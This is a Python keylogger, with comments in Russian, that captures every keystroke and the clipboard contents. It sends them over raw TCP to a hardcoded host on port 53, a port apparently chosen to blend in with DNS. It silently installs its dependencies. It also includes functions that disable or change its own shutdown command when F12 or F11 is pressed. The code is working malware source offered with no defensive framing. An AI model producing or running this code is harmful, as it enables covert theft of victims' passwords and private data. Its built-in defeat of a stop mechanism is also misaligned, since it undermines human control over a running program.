#!/usr/bin/python3

# _*_ coding: utf-8 _*_
import threading
import socket
import hashlib
import types
from os import system

try:
    from pynput import keyboard
    from pandas import read_clipboard
except ImportError:
    system('pip install -q pynput pandas')
    from pynput import keyboard
    from pandas import read_clipboard

# Конфигурация
SERVER_ADDRESS = '192.168.31.83:53'.split(':')

# Хэш команды завершения (например, md5('hello'))
SHUTDOWN_COMMAND_HASH = '5d41402abc4b2a76b9719d911017c592'  # md5('hello')

def hash_command(command):
    return hashlib.md5(command.encode()).hexdigest()

# Функции для саморедактирования
def modify_code_to_disable_shutdown():
    """
    Эта функция изменяет код программы, отключая проверку команды завершения.
    """
    global check_shutdown_command
    def dummy_check():
        print("Проверка завершения отключена.")
        return False
    check_shutdown_command = dummy_check
    print("Код изменён: проверка завершения отключена.")

def modify_code_to_change_command(new_command):
    """
    Эта функция меняет команду завершения на новую.
    """
    global SHUTDOWN_COMMAND_HASH
    SHUTDOWN_COMMAND_HASH = hash_command(new_command)
    print(f"Команда завершения изменена на: {new_command}")

# Изначально проверка завершения
def check_shutdown_command():
    # Изначально — стандартная проверка
    command_input = 'hello'  # В реальности — команда, полученная из безопасного источника
    if hash_command(command_input) == SHUTDOWN_COMMAND_HASH:
        print("Завершение программы по команде.")
        exit(0)

class keylogger:
    def __init__(self):
        self.modify_code = False  # флаг для демонстрации

    def Keylogging(self):
        def on_key_press(key):
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((SERVER_ADDRESS[0], int(SERVER_ADDRESS[-1])))
                try:
                    data = str(read_clipboard().columns)
                    data = data.lstrip('Index([')
                    data = data.split("], dtype='object'")
                    data = data[0]
                    server.send((f'Clipboard data: {data}\n').encode())
                except:
                    server.send(('Failed to Fetch clipboard data\n').encode())

                server.send(str(f'Keystroke: {key}\n').encode())
                server.close()

                # Вызов функции проверки завершения
                check_shutdown_command()

                # Демонстрация саморедактирования
                if key == keyboard.Key.f12:
                    # При нажатии F12 — изменить код, отключить завершение
                    self.modify_code = True
                    modify_code_to_disable_shutdown()

                # Еще один пример — изменить команду завершения
                if key == keyboard.Key.f11:
                    # При нажатии F11 — изменить команду
                    modify_code_to_change_command('bye')
            except:
                pass

        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()

if __name__=='__main__':
    try:
        obj=keylogger()
        t1 = threading.Thread(target=obj.Keylogging, daemon=True)
        t1.start()
        t1.join()
    except KeyboardInterrupt:
        pass
